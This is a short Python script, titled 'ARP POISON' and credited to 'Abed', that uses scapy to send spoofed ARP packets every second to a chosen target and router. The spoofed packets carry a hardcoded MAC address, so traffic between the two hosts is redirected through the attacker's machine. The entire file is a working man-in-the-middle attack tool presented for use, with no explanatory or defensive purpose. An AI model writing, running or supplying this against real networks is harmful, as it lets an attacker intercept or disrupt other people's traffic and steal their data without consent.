#!/usr/bin/python3
from scapy.all import *
import socket
import time

banner = """\33[91m
#       _    ____  ____    ____   ___ ___ ____   ___  _   _ 
#      / \  |  _ \|  _ \  |  _ \ / _ \_ _/ ___| / _ \| \ | |
#     / _ \ | |_) | |_) | | |_) | | | | |\___ \| | | |  \| |
#    / ___ \|  _ <|  __/  |  __/| |_| | | ___) | |_| | |\  |
#   /_/   \_\_| \_\_|     |_|    \___/___|____/ \___/|_| \_|
#   By Abed\033[0m                                                 
                                                            """

def get_ip(prompt="Enter IP: "):
	while True:
		ip = input(prompt)
		try:
			socket.inet_aton(ip)
			return ip
		except socket.error:
			print("Invalid IP address")
			continue
		else:
			break

def arp_poison():
	tgt = get_ip("Enter target IP: ")
	rtr = get_ip("Enter router IP: ")

	tgt_pkt = Ether()/ARP(op="who-has",hwsrc="00:0c:29:93:67:7c",psrc=rtr,pdst=tgt)
	rtr_pkt = Ether()/ARP(op="who-has",hwsrc="00:0c:29:93:67:7c",psrc=tgt,pdst=rtr)

	while True:
		try:
			time.sleep(1)
			sendp(tgt_pkt)
			sendp(rtr_pkt)
		except PermissionError:
			print("\33[91mPermission Error:\33[0m Run as sudo.")
			break

def main():
	print(banner)
	try:
		arp_poison()
	except KeyboardInterrupt:
		print("\n\33[93mQuitting arp poison.\33[0m")

if __name__ == "__main__":
	main()
